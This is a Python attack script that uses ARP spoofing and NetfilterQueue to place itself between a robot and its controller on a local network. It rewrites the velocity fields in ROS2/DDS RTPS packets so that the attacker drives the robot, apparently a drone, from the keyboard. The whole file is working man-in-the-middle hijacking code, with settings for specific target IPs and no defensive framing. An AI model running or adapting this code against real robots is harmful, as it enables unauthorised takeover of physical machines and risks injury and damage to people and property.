from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys
import select
import tty
import termios

# --- SETTINGS ---
robot_ip = "192.168.0.194"
controller_ip = "192.168.0.16"
interface = "wlan0"
queue_number = 1

# Shared control variables
target_linear = 0.0
target_angular = 0.0

# --- SSH KEYBOARD ENGINE ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def keyboard_control_thread():
    global target_linear, target_angular
    # Adjust these steps if the drone is too fast or too slow
    speed = 1.5  
    turn = 2.0   
    
    print("[*] SSH DRIVE ACTIVE: S (Forward), W (Back), A (Left), D (Right)")
    
    while True:
        key = get_key()
        if key:
            k = key.lower()
            if k == 's': # You mentioned S makes it move forward
                target_linear = speed; target_angular = 0.0
            elif k == 'w':
                target_linear = -speed; target_angular = 0.0
            elif k == 'a': # Turn Left
                target_linear = 0.0; target_angular = turn
            elif k == 'd': # Turn Right
                target_linear = 0.0; target_angular = -turn
            elif k == ' ':
                target_linear = 0.0; target_angular = 0.0
                print("\n[!] EMERGENCY STOP")
        time.sleep(0.05)

# --- MAC RESOLUTION & ARP SPOOFING ---
def get_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        with open("/proc/net/arp") as f:
            for line in f:
                fields = line.split()
                if fields[0] == ip: return fields[3]
    except: pass
    return None

def spoof(target_ip, host_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, iface=interface, verbose=False)

def arp_poison_thread(robot_mac, controller_mac):
    while True:
        spoof(robot_ip, controller_ip, robot_mac)
        spoof(controller_ip, robot_ip, controller_mac)
        time.sleep(1.5) # Slightly faster spoofing to stay ahead of the controller

# --- SMART PACKET PROCESSING ---
def process_packet(packet):
    global target_linear, target_angular
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(Raw):
            raw_data = scapy_pkt[Raw].load
            
            # 1. Find the RTPS Data Marker
            marker = b'\x15\x05'
            marker_pos = raw_data.find(marker)
            
            if marker_pos != -1:
                # 2. Find the CDR Encapsulation Header (Common in ROS2/DDS)
                # This header is followed by the actual Float64 values
                cdr_header = b'\x00\x00\x01\x00'
                data_start = raw_data.find(cdr_header, marker_pos)
                
                if data_start != -1:
                    # Temporary Diagnostic inside process_packet (right after data_start != -1)
                    for offset in [0, 4, 8, 12, 16]:
                        potential_val = struct.unpack('<d', raw_data[data_start + offset : data_start + offset + 8])[0]
                        if 0.01 < abs(potential_val) < 5.0:
                            print(f"[!!!] FOUND REAL VELOCITY AT OFFSET: data_start + {offset} (Value: {potential_val})")

                    lin_x_off = data_start + 4
                    # Angular Z is always exactly 40 bytes after Linear X (skipping Y, Z, AngX, AngY)
                    ang_z_off = lin_x_off + 40
                    
                    if len(raw_data) >= ang_z_off + 8:
                        # Perform the Injection
                        new_payload = (
                            raw_data[:lin_x_off] + 
                            struct.pack('<d', float(target_linear)) + 
                            raw_data[lin_x_off+8:ang_z_off] + 
                            struct.pack('<d', float(target_angular)) + 
                            raw_data[ang_z_off+8:]
                        )
                        
                        scapy_pkt[Raw].load = new_payload
                        
                        # Fix Checksums
                        del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
                        del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
                        
                        packet.set_payload(bytes(scapy_pkt))
                        
                        if target_linear != 0 or target_angular != 0:
                            print(f"\r[*] COMMANDING: Lin:{target_linear:.1f} Ang:{target_angular:.1f}  ", end="")

    except Exception as e:
        pass

    packet.accept()

if __name__ == "__main__":
    r_mac = get_mac(robot_ip)
    c_mac = get_mac(controller_ip)
    
    if r_mac and c_mac:
        threading.Thread(target=arp_poison_thread, args=(r_mac, c_mac), daemon=True).start()
        threading.Thread(target=keyboard_control_thread, daemon=True).start()
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)
        print(f"[*] MITM HIJACK STARTED: {controller_ip} -> {robot_ip}")
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            nfqueue.unbind()